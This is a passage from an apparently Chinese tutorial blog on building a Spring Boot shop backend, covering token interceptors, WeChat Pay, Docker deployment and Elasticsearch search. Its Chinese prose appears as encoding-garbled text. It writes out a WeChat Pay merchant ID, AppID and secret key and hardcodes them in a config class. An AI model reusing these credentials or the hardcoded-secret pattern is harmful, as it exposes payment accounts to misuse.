class="hljs-string">&quot;/**&quot;</span>)  <span class="hljs-comment">// æ‹¦æˆªæ‰€æœ‰è·¯å¾„</span>        .excludePathPatterns(<span class="hljs-string">&quot;/user/**&quot;</span>); <span class="hljs-comment">// é™¤äº†ç”¨æˆ·ç™»å½•å’Œæ³¨å†Œè·¯å¾„</span>    &#125;&#125;</code></pre></li></ul><h3 id="2-2-é€šè¿‡headerä¼ é€’token"><a href="#2-2-é€šè¿‡headerä¼ é€’token" class="headerlink" title="2.2 é€šè¿‡headerä¼ é€’token"></a>2.2 é€šè¿‡headerä¼ é€’token</h3><blockquote><p>å‰ç«¯è®¿é—®å—é™èµ„æºæ—¶ï¼Œéƒ½å¿…é¡»æºå¸¦tokenå‘é€è¯·æ±‚ï¼Œtokenå¯ä»¥æ”¾åœ¨è¯·æ±‚è¡Œ(params)ã€è¯·æ±‚å¤´(header)ä»¥åŠè¯·æ±‚ä½“(data)ï¼Œä½†æ˜¯ä¸€èˆ¬é»˜è®¤æ”¾åœ¨è¯·æ±‚å¤´ä¸­</p></blockquote><ul><li><p>å‰ç«¯ä½¿ç”¨axios</p><pre><code class="hljs js">axios(&#123;    url:url,    method:<span class="hljs-string">&quot;get&quot;</span>,    headers:&#123;        token:token    &#125;,    params:&#123;        userId:userId    &#125;&#125;)</code></pre></li></ul><ul><li><p>æµè§ˆå™¨çš„é¢„æ£€æœºåˆ¶</p><p>åªè¦æ˜¯å¸¦è‡ªå®šä¹‰headerçš„è·¨åŸŸè¯·æ±‚ï¼Œåœ¨å‘é€çœŸå®è¯·æ±‚å‰éƒ½ä¼šå…ˆå‘é€OPTIONSè¯·æ±‚ï¼Œæµè§ˆå™¨æ ¹æ®OPTIONSè¯·æ±‚è¿”å›çš„ç»“æœæ¥å†³å®šæ˜¯å¦ç»§ç»­å‘é€çœŸå®çš„è¯·æ±‚è¿›è¡Œè·¨åŸŸèµ„æºè®¿é—®ã€‚æ‰€ä»¥å¤æ‚è¯·æ±‚è‚¯å®šä¼šä¸¤æ¬¡è¯·æ±‚æœåŠ¡ç«¯ã€‚</p><p>å› æ­¤éœ€è¦åœ¨æ‹¦æˆªå™¨ä¸­åŠ å…¥ä»¥ä¸‹ä»£ç ï¼Œå¿…è¦å“åº”ç¬¬ä¸€æ¬¡çš„OPTIONSè¯·æ±‚åï¼Œæ‰èƒ½æ”¶åˆ°ç¬¬äºŒæ¬¡çš„GETè¯·æ±‚ã€‚</p><pre><code class="hljs java">String method = request.getMethod();System.out.println(method);<span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;OPTIONS&quot;</span>.equals(method))&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;&#125;</code></pre></li><li></li></ul><h2 id="3-é€šç”¨å®ä½“ç±»"><a href="#3-é€šç”¨å®ä½“ç±»" class="headerlink" title="3.é€šç”¨å®ä½“ç±»"></a>3.é€šç”¨å®ä½“ç±»</h2><p>3.1 ç”¨äºå“åº”çš„å®ä½“ç±»</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.fmmall.vo;<span class="hljs-keyword">import</span> io.swagger.annotations.ApiModel;<span class="hljs-keyword">import</span> io.swagger.annotations.ApiModelProperty;<span class="hljs-keyword">import</span> lombok.AllArgsConstructor;<span class="hljs-keyword">import</span> lombok.Data;<span class="hljs-keyword">import</span> lombok.NoArgsConstructor;<span class="hljs-keyword">import</span> javax.annotation.Resource;<span class="hljs-meta">@Data</span><span class="hljs-meta">@NoArgsConstructor</span><span class="hljs-meta">@AllArgsConstructor</span><span class="hljs-meta">@ApiModel(value = &quot;ResultVOå¯¹è±¡&quot;,description = &quot;å°è£…æ¥å£è¿”å›ç»™å‰ç«¯çš„æ•°æ®&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ResultVO</span> </span>&#123;    <span class="hljs-comment">//å“åº”ç»™å‰ç«¯çš„çŠ¶æ€ç </span>    <span class="hljs-meta">@ApiModelProperty(value = &quot;å“åº”çŠ¶æ€ç &quot;,dataType = &quot;int&quot;)</span>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> code;    <span class="hljs-comment">//å“åº”ç»™å‰ç«¯çš„æç¤ºä¿¡æ¯</span>    <span class="hljs-meta">@ApiModelProperty(&quot;å“åº”æç¤ºä¿¡æ¯&quot;)</span>    <span class="hljs-keyword">private</span> String msg;    <span class="hljs-comment">//å“åº”ç»™å‰ç«¯çš„æ•°æ®</span>    <span class="hljs-meta">@ApiModelProperty(&quot;å“åº”æ•°æ®&quot;)</span>    <span class="hljs-keyword">private</span> Object data;        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResultVO <span class="hljs-title">success</span><span class="hljs-params">()</span></span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, <span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-keyword">null</span>);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResultVO <span class="hljs-title">success</span><span class="hljs-params">(String msg)</span></span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, msg, <span class="hljs-keyword">null</span>);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResultVO <span class="hljs-title">success</span><span class="hljs-params">(Object obj)</span></span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, <span class="hljs-string">&quot;success&quot;</span>, obj);    &#125;        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResultVO <span class="hljs-title">failed</span><span class="hljs-params">()</span></span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;failed&quot;</span>, <span class="hljs-keyword">null</span>);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResultVO <span class="hljs-title">failed</span><span class="hljs-params">(String msg)</span></span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, msg, <span class="hljs-keyword">null</span>);    &#125;&#125;</code></pre><h2 id="4-å¾®ä¿¡æ”¯ä»˜"><a href="#4-å¾®ä¿¡æ”¯ä»˜" class="headerlink" title="4 å¾®ä¿¡æ”¯ä»˜"></a>4 å¾®ä¿¡æ”¯ä»˜</h2><blockquote><p>é€šè¿‡å¾®ä¿¡å¹³å°ä¸ºå•†å®¶æä¾›ä»£æ”¶æ¬¾æœåŠ¡</p></blockquote><h3 id="4-1-å•†æˆ·æ³¨å†Œå¾®ä¿¡æ”¯ä»˜ä¸šåŠ¡"><a href="#4-1-å•†æˆ·æ³¨å†Œå¾®ä¿¡æ”¯ä»˜ä¸šåŠ¡" class="headerlink" title="4.1 å•†æˆ·æ³¨å†Œå¾®ä¿¡æ”¯ä»˜ä¸šåŠ¡"></a>4.1 å•†æˆ·æ³¨å†Œå¾®ä¿¡æ”¯ä»˜ä¸šåŠ¡</h3><ul><li>å•†æˆ·ç¼–å·ï¼š1497984412</li><li>å•†æˆ·è´¦å·AppIDï¼šwx632c8f211f8122c6</li><li>å•†æˆ·Keyï¼šsbNCm1JnevqI36LrEaxFwcaT0hkGxFnC</li></ul><h3 id="4-2-å•†æˆ·å‘å¾®ä¿¡ç”³è¯·æ”¯ä»˜è®¢å•ï¼Œå³æ”¯ä»˜çŸ­é“¾æ¥"><a href="#4-2-å•†æˆ·å‘å¾®ä¿¡ç”³è¯·æ”¯ä»˜è®¢å•ï¼Œå³æ”¯ä»˜çŸ­é“¾æ¥" class="headerlink" title="4.2 å•†æˆ·å‘å¾®ä¿¡ç”³è¯·æ”¯ä»˜è®¢å•ï¼Œå³æ”¯ä»˜çŸ­é“¾æ¥"></a>4.2 å•†æˆ·å‘å¾®ä¿¡ç”³è¯·æ”¯ä»˜è®¢å•ï¼Œå³æ”¯ä»˜çŸ­é“¾æ¥</h3><ul><li><p>å¯¼å…¥å¾®ä¿¡æ”¯ä»˜çš„ä¾èµ–</p><pre><code class="hljs XML"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.wxpay<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>wxpay-sdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></li><li><p>åˆ›å»ºWXPayConfigï¼Œé‡å†™é‡Œé¢çš„æ–¹æ³•ï¼Œè®¾ç½®è‡ªå·±çš„AppIDï¼Œå•†æˆ·idï¼Œå¯†é’¥ï¼Œ</p><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyPayConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">WXPayConfig</span> </span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getAppID</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;wx632c8f211f8122c6&quot;</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getMchID</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1497984412&quot;</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getKey</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;sbNCm1JnevqI36LrEaxFwcaT0hkGxFnC&quot;</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> InputStream <span class="hljs-title">getCertStream</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getHttpConnectTimeoutMs</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getHttpReadTimeoutMs</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;&#125;</code></pre></li><li><p>è®¾ç½®â½€ä»˜è®¢å•çš„å‚æ•°</p><pre><code class="hljs java">HashMap&lt;String,String&gt; data = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();data.put(<span class="hljs-string">&quot;body&quot;</span>,<span class="hljs-string">&quot;å’ªå’ªè§æ¡&quot;</span>); <span class="hljs-comment">//å•†å“æè¿°</span>data.put(<span class="hljs-string">&quot;out_trade_no&quot;</span>,orderId); <span class="hljs-comment">//ä½¿â½¤å½“å‰â½¤æˆ·è®¢å•çš„ç¼–å·ä½œä¸ºå½“å‰â½€ä»˜äº¤æ˜“çš„</span>äº¤æ˜“å·data.put(<span class="hljs-string">&quot;fee_type&quot;</span>,<span class="hljs-string">&quot;CNY&quot;</span>); <span class="hljs-comment">//â½€ä»˜å¸ç§</span>data.put(<span class="hljs-string">&quot;total_fee&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>); <span class="hljs-comment">//â½€ä»˜â¾¦é¢</span>data.put(<span class="hljs-string">&quot;trade_type&quot;</span>,<span class="hljs-string">&quot;NATIVE&quot;</span>); <span class="hljs-comment">//äº¤æ˜“ç±»å‹</span>data.put(<span class="hljs-string">&quot;notify_url&quot;</span>,<span class="hljs-string">&quot;/pay/success&quot;</span>); <span class="hljs-comment">//è®¾ç½®â½€ä»˜å®Œæˆæ—¶çš„å›è°ƒâ½…æ³•</span>æ¥â¼</code></pre></li><li><p>ç”³è¯·æ”¯ä»˜è¿æ¥</p><pre><code class="hljs java">WXPay wxPay = <span class="hljs-keyword">new</span> WXPay(<span class="hljs-keyword">new</span> MyPayConfig());Map&lt;String, String&gt; resp = wxPay.unifiedOrder(data); <span class="hljs-comment">//å‘é€è¯·æ±‚</span>orderInfo.put(<span class="hljs-string">&quot;payUrl&quot;</span>,resp.get(<span class="hljs-string">&quot;code_url&quot;</span>));</code></pre></li></ul><h2 id="5-Ngrokå®ç°å†…ç½‘ç©¿é€"><a href="#5-Ngrokå®ç°å†…ç½‘ç©¿é€" class="headerlink" title="5 Ngrokå®ç°å†…ç½‘ç©¿é€"></a>5 Ngrokå®ç°å†…ç½‘ç©¿é€</h2><ul><li><p>æ³¨å†ŒNgrokåè¿›è¡Œå®åè®¤è¯</p></li><li><p>å¼€é€šéš§é“</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715164520718.png" alt="image-20220715164520718"></p></li><li><p>è·å–éš§é“ID</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715164621244.png" alt="image-20220715164621244"></p></li><li><p>ä¸‹è½½ngorkå®¢æˆ·ç«¯</p></li><li><p>å¯åŠ¨å®¢æˆ·ç«¯ï¼Œè¾“å…¥å¯¹åº”çš„éš§é“IDï¼Œå³å¯å®ç°å†…ç½‘ç©¿é€</p></li></ul><h2 id="6-quartzå®šæ—¶ä»»åŠ¡æ¡†æ¶ä½¿â½¤"><a href="#6-quartzå®šæ—¶ä»»åŠ¡æ¡†æ¶ä½¿â½¤" class="headerlink" title="6 quartzå®šæ—¶ä»»åŠ¡æ¡†æ¶ä½¿â½¤"></a>6 quartzå®šæ—¶ä»»åŠ¡æ¡†æ¶ä½¿â½¤</h2><h3 id="6-1-å¯¼å…¥ä¾èµ–"><a href="#6-1-å¯¼å…¥ä¾èµ–" class="headerlink" title="6.1 å¯¼å…¥ä¾èµ–"></a>6.1 å¯¼å…¥ä¾èµ–</h3><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-quartz<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre><h3 id="6-2-åˆ›å»ºå®šæ—¶ä»»åŠ¡"><a href="#6-2-åˆ›å»ºå®šæ—¶ä»»åŠ¡" class="headerlink" title="6.2 åˆ›å»ºå®šæ—¶ä»»åŠ¡"></a>6.2 åˆ›å»ºå®šæ—¶ä»»åŠ¡</h3><pre><code class="hljs java"><span class="hljs-meta">@Component</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PrintHelloWorldJob</span> </span>&#123; <span class="hljs-comment">//https://cron.qqe2.com</span> <span class="hljs-meta">@Scheduled(cron = &quot;0/3 * * * * ?&quot;)</span> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">printHelloWorld</span><span class="hljs-params">()</span></span>&#123; System.out.println(<span class="hljs-string">&quot;----hello world.&quot;</span>); &#125;&#125;</code></pre><h3 id="6-3-åœ¨å¯åŠ¨ç±»æ·»åŠ æ³¨è§£ä»¥å¼€å¯å®šæ—¶ä»»åŠ¡"><a href="#6-3-åœ¨å¯åŠ¨ç±»æ·»åŠ æ³¨è§£ä»¥å¼€å¯å®šæ—¶ä»»åŠ¡" class="headerlink" title="6.3 åœ¨å¯åŠ¨ç±»æ·»åŠ æ³¨è§£ä»¥å¼€å¯å®šæ—¶ä»»åŠ¡"></a>6.3 åœ¨å¯åŠ¨ç±»æ·»åŠ æ³¨è§£ä»¥å¼€å¯å®šæ—¶ä»»åŠ¡</h3><pre><code class="hljs java"><span class="hljs-meta">@SpringBootApplication</span><span class="hljs-meta">@EnableScheduling</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">QuartzDemoApplication</span> </span>&#123; <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123; SpringApplication.run(QuartzDemoApplication.class, args); &#125;&#125;</code></pre><p>å½“æ§åˆ¶å°æ‰“å°å‡ºè¿™æ®µæ—¥å¿—æ—¶ï¼Œè¯´æ˜å®šæ—¶ä»»åŠ¡åˆ›å»ºæˆåŠŸ</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220716085923884.png" alt="image-20220716085923884"></p><h2 id="7-åç«¯é¡¹ç›®éƒ¨ç½²"><a href="#7-åç«¯é¡¹ç›®éƒ¨ç½²" class="headerlink" title="7 åç«¯é¡¹ç›®éƒ¨ç½²"></a>7 åç«¯é¡¹ç›®éƒ¨ç½²</h2><p>ä½¿ç”¨dockeréƒ¨ç½²é¡¹ç›®</p><ul><li><p>Dockerfile</p><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> java:<span class="hljs-number">8</span>-alpine<span class="hljs-keyword">COPY</span><span class="bash"> ./app.jar /tmp/app.jar</span><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><span class="hljs-keyword">ENTRYPOINT</span><span class="bash"> java -jar /tmp/app.jar</span></code></pre></li><li><p>é¡¹ç›®æ‰“åŒ…</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220719123949027.png" alt="image-20220719123949027"></p></li><li><p>å°†jaråŒ…æ”¾åˆ°ä¸dockerfileåŒä¸€ç›®å½•ä¸‹</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220719124037998.png" alt="image-20220719124037998"></p></li><li><p>ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸­æ„å»ºé•œåƒ</p><p>è¿›å…¥åˆ°Dockerfileæ‰€åœ¨çš„ç›®å½•ä¸‹ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤</p><pre><code class="hljs sh">docker build -t fmmall .</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220719124317986.png" alt="image-20220719124317986"></p></li><li><p>åˆ›å»ºå®¹å™¨</p><pre><code class="hljs sh">docker run --name fmmall -p 8080:8080 -d  fmmall</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220719124407926.png" alt="image-20220719124407926"></p></li></ul><h2 id="åˆ†å¸ƒå¼"><a href="#åˆ†å¸ƒå¼" class="headerlink" title="åˆ†å¸ƒå¼"></a>åˆ†å¸ƒå¼</h2><h3 id="ä½¿ç”¨watch-dogæœºåˆ¶ç›‘è§†redisä¸­keyçš„è¿‡æœŸæ—¶é—´"><a href="#ä½¿ç”¨watch-dogæœºåˆ¶ç›‘è§†redisä¸­keyçš„è¿‡æœŸæ—¶é—´" class="headerlink" title="ä½¿ç”¨watch dogæœºåˆ¶ç›‘è§†redisä¸­keyçš„è¿‡æœŸæ—¶é—´"></a>ä½¿ç”¨watch dogæœºåˆ¶ç›‘è§†redisä¸­keyçš„è¿‡æœŸæ—¶é—´</h3><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220726222800912.png" alt="image-20220726222800912"></p><blockquote><p>çœ‹é—¨ç‹—çº¿ç¨‹ï¼šç”¨äºç»™å½“å‰çš„keyå»¶é•¿è¿‡æœŸæ—¶é—´ï¼Œä¿è¯ä¸šåŠ¡çº¿ç¨‹æ­£å¸¸æ‰§è¡Œè¿‡ç¨‹ï¼Œé”ä¸ä¼šè¿‡æœŸ</p></blockquote><h3 id="åˆ†å¸ƒå¼é”æ¡†æ¶-redisson"><a href="#åˆ†å¸ƒå¼é”æ¡†æ¶-redisson" class="headerlink" title="åˆ†å¸ƒå¼é”æ¡†æ¶-redisson"></a>åˆ†å¸ƒå¼é”æ¡†æ¶-redisson</h3><blockquote><p>åŸºäºredis+çœ‹é—¨ç‹—å®ç°çš„åˆ†å¸ƒå¼é”æ¡†æ¶</p></blockquote><h3 id="ES"><a href="#ES" class="headerlink" title="ES"></a>ES</h3><h4 id="springbootæ•´åˆES"><a href="#springbootæ•´åˆES" class="headerlink" title="springbootæ•´åˆES"></a>springbootæ•´åˆES</h4><ul><li><p>å¯¼å…¥ä¾èµ–</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-elasticsearch<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></li><li><p>é…ç½®ä¿¡æ¯</p><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span>  <span class="hljs-attr">elasticsearch:</span>    <span class="hljs-attr">rest:</span>      <span class="hljs-attr">uris:</span> <span class="hljs-string">http://192.168.238.132:9200</span></code></pre></li><li><p>å°†æ•°æ®åº“ä¸­çš„ä¿¡æ¯å¯¼å…¥åˆ°ESä¸­</p><blockquote><p>å¦‚æœå•†å“è¡¨ä¸­æ²¡æœ‰æ•°æ®ï¼Œåˆ™åœ¨å¹³å°ç®¡ç†ç³»ç»Ÿä¸­çš„å•†å“æ·»åŠ åŠŸèƒ½ä¸­ï¼Œå½“å•†å®¶å‘å•†å“è¡¨æ·»åŠ å¹¶ä¸Šæ¶ä¸€ä¸ªå•†å“æ—¶åŒæ­¥å‘ESæ·»åŠ ä¸€ä¸ªå•†å“;å•†å®¶ä¸‹æ¶ä¸€ä¸ªå•†å“å°±ä»ESä¸­åˆ é™¤ä¸€ä¸ªå•†å“ã€‚<br>ç³»ç»Ÿè¿è¡Œå‰æœŸæ•°æ®é‡å°æ²¡æœ‰ä½¿ç”¨ESï¼Œå½“æ•°æ®é‡å¢é•¿ä¹‹åä½¿ç”¨ESæ—¶ï¼Œéœ€è¦å°†æ•°æ®åº“ç°æœ‰çš„æ•°æ®å¯¼å…¥åˆ°ES(å¯¼å…¥å·¥ä½œéœ€è¦åœ¨é¡¹ç›®éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒä¹‹å‰æ¥å®Œæˆ)</p></blockquote><pre><code class="hljs java"><span class="hljs-comment">// 1.æŸ¥è¯¢æ•°æ®åº“è·å–åˆ°æ‰€æœ‰æ•°æ®</span>        List&lt;ProductVO&gt; productVOS = productMapper.selectProducts();        <span class="hljs-keyword">int</span> size = productVOS.size();<span class="hljs-comment">//        return ResultVO.success(size);</span>        <span class="hljs-comment">// 2. éå†æ•°æ®å°†æ•°æ®å†™å…¥åˆ°ESä¸­</span>        <span class="hljs-keyword">this</span>.client =<span class="hljs-keyword">new</span> RestHighLevelClient(RestClient.builder(                HttpHost.create(<span class="hljs-string">&quot;http://192.168.238.132:9200&quot;</span>)        ));        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; productVOS.size(); i++) &#123;            ProductVO productVO = productVOS.get(i);            String productId = productVO.getProductId();            String productName = productVO.getProductName();            Integer soldNum = productVO.getSoldNum();            List&lt;ProductSku&gt; skus = productVO.getSkus();            String skuImg = skus.size() == <span class="hljs-number">0</span>? <span class="hljs-string">&quot;&quot;</span>: productVO.getSkus().get(<span class="hljs-number">0</span>).getSkuImg();            String skuName = skus.size() == <span class="hljs-number">0</span>? <span class="hljs-string">&quot;&quot;</span>: productVO.getSkus().get(<span class="hljs-number">0</span>).getSkuName();            Integer sellPrice = skus.size() == <span class="hljs-number">0</span>? <span class="hljs-number">0</span>: productVO.getSkus().get(<span class="hljs-number">0</span>).getSellPrice();            Product4ES product4ES = <span class="hljs-keyword">new</span> Product4ES(productId, productName, skuImg, soldNum, skuName, sellPrice);            IndexRequest request = <span class="hljs-keyword">new</span> IndexRequest(<span class="hljs-string">&quot;fmmallproductindex&quot;</span>);            request.id(productId).source(JSON.toJSONString(product4ES), XContentType.JSON);            IndexResponse index = <span class="hljs-keyword">this</span>.client.index(request, RequestOptions.DEFAULT);            System.out.println(<span class="hljs-string">&quot;------ i &quot;</span> + i + <span class="hljs-string">&quot;-----&quot;</span> + index);        &#125;        <span class="hljs-keyword">this</span>.client.close();</code></pre></li></ul><ul><li><p>ä½¿ç”¨ESè¿›è¡Œè¿›è¡Œå…¨æ–‡æœç´¢</p><pre><code class="hljs java"><span class="hljs-comment">/*ä»ESä¸­æŸ¥è¯¢ä¿¡æ¯*/</span><span class="hljs-keyword">this</span>.client =<span class="hljs-keyword">new</span> RestHighLevelClient(RestClient.builder(    HttpHost.create(<span class="hljs-string">&quot;http://192.168.238.132:9200&quot;</span>)));<span class="hljs-keyword">int</span> start = (pageNum-<span class="hljs-number">1</span>)*limit;SearchRequest request = <span class="hljs-keyword">new</span> SearchRequest(<span class="hljs-string">&quot;fmmallproductindex&quot;</span>);SearchSourceBuilder sourceBuilder = <span class="hljs-keyword">new</span> SearchSourceBuilder();sourceBuilder.query(QueryBuilders.multiMatchQuery(kw, <span class="hljs-string">&quot;productName&quot;</span>, <span class="hljs-string">&quot;pruductSkuName&quot;</span>));<span class="hljs-comment">// åˆ†é¡µæ¡ä»¶</span>sourceBuilder.from(start);sourceBuilder.size(limit);<span class="hljs-comment">// é«˜äº®æ˜¾ç¤º</span>HighlightBuilder highlightBuilder = <span class="hljs-keyword">new</span> HighlightBuilder();HighlightBuilder.Field productName = <span class="hljs-keyword">new</span> HighlightBuilder.Field(<span class="hljs-string">&quot;productName&quot;</span>);HighlightBuilder.Field pruductSkuName = <span class="hljs-keyword">new</span> HighlightBuilder.Field(<span class="hljs-string">&quot;pruductSkuName&quot;</span>);highlightBuilder.field(productName);highlightBuilder.field(pruductSkuName);highlightBuilder.preTags(<span class="hljs-string">&quot;&lt;label style=&#x27;color:red&#x27;&gt;&quot;</span>);highlightBuilder.postTags(<span class="hljs-string">&quot;&lt;label&gt;&quot;</span>);sourceBuilder.highlighter(highlightBuilder);request.source(sourceBuilder);SearchResponse searchResponse = <span class="hljs-keyword">null</span>;<span class="hljs-keyword">try</span> &#123;    searchResponse = <span class="hljs-keyword">this</span>.client.search(request, RequestOptions.DEFAULT);&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;    e.printStackTrace();&#125;<span class="hljs-comment">// å¤„ç†å“åº”ç»“æœ</span>SearchHits hits = searchResponse.getHits();TotalHits totalHits = hits.getTotalHits();<span class="hljs-keyword">int</span> count = (<span class="hljs-keyword">int</span>) totalHits.value;   <span class="hljs-comment">// æŸ¥è¯¢åˆ°çš„è®°å½•æ€»æ•°</span><span class="hljs-keyword">int</span> pageCount = (count%limit==<span class="hljs-number">0</span>? count/limit:count/limit+<span class="hljs-number">1</span>);Iterator&lt;SearchHit&gt; iterator = hits.iterator();List&lt;Product4ES&gt; product4ESList = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<span class="hljs-keyword">while</span>(iterator.hasNext())&#123;    SearchHit nextHit = iterator.next();    String sourceAsString = nextHit.getSourceAsString();    Product4ES product4ES = JSON.parseObject(sourceAsString, Product4ES.class);    <span class="hljs-comment">// è·å–é«˜äº®å­—æ®µ</span>    Map&lt;String, HighlightField&gt; highlightFields = nextHit.getHighlightFields();    HighlightField highLightProductName = highlightFields.get(<span class="hljs-string">&quot;productName&quot;</span>);    <span class="hljs-keyword">if</span>(highLightProductName != <span class="hljs-keyword">null</span>)&#123;        String string = Arrays.toString(highLightProductName.fragments());        product4ES.setProductName(string);    &#125;    product4ESList.add(product4ES);&#125;PageHelper&lt;Product4ES&gt; pageHelper = <span class="hljs-keyword">new</span> PageHelper&lt;&gt;(count, pageCount, product4ESList);ResultVO resultVO = <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, <span class="hljs-string">&quot;SUCCESS&quot;</span>, pageHelper);<span class="hljs-keyword">return</span> resultVO;</code></pre></li></ul><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220730122320909.png" alt="image-20220730122320909"></p><h3 id="æ­å»ºæœåŠ¡å‘ç°å’Œæ³¨å†Œä¸­å¿ƒEureka"><a href="#æ­å»ºæœåŠ¡å‘ç°å’Œæ³¨å†Œä¸­å¿ƒEureka" class="headerlink" title="æ­å»ºæœåŠ¡å‘ç°å’Œæ³¨å†Œä¸­å¿ƒEureka"></a>æ­å»ºæœåŠ¡å‘ç°å’Œæ³¨å†Œä¸­å¿ƒEureka</h3><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220730180822713.png" alt="image-20220730180822713" style="zoom:67%;"><ul><li><p>æ·»åŠ å…³äºeruekaç›¸å…³é…ç½®ä¿¡æ¯</p><pre><code class="hljs properties"><span class="hljs-attr">eureka</span>:<span class="hljs-string"></span>  <span class="hljs-attr">client</span>:<span class="hljs-string"></span>    <span 